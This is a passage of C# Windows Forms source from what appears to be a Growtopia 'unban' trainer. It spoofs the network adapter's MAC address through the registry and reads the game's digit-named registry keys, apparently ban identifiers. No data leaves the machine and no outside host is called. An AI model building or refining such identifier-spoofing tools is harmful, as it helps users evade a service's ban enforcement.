                    string message = "                                                Can't UNBAN!                                                          Tip: Open Growtopia and click 'Connect'. Then Restart the Trainer!";
                    MessageBox.Show(message);
                }
            }
            catch (Exception) { }
        }

        private void SetRegistryMac(string mac)
        {
            Adapter a = AdaptersComboBox.SelectedItem as Adapter;
            if (a.SetRegistryMac(mac))
            {
                System.Threading.Thread.Sleep(100);
                UpdateAddresses();
            }
        }

        private void RegistryRefresher_Click(object sender, EventArgs e)
        {
            UpdateAddresses();
            if (RegistryRefresher.BackColor == Color.Black)
            {
                foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
                {
                    if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
                    {
                        shortkey.Text = subkeyname;
                        break;
                    }
                }
                foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
                {
                    if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
                    {
                        longkey.Text = subkeyname2;
                        break;
                    }
                }
            }
            else
            {
                foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
                {
                    if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
                    {
                        shortkey.Text = subkeyname;
                        break;
                    }
                }
                foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
                {
                    if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
                    {
                        longkey.Text = subkeyname2;
                        break;
                    }
                }
            }
        }

        private void RandomMacAdressTimer_Tick(object sender, EventArgs e)
        {
            CurrentMacTextBox.Text = Adapter.GetNewMac();
        }

        private void Update_Tick(object sender, EventArgs e)
        {
            foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
            {
                if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
                {
                    shortkey.Text = subkeyname;
                    break;
                }
            }
            foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
            {
                if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
                {
                    longkey.Text = subkeyname2;
                    break;
                }
            }
        }

        private void RestartTrainer_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }
    }
}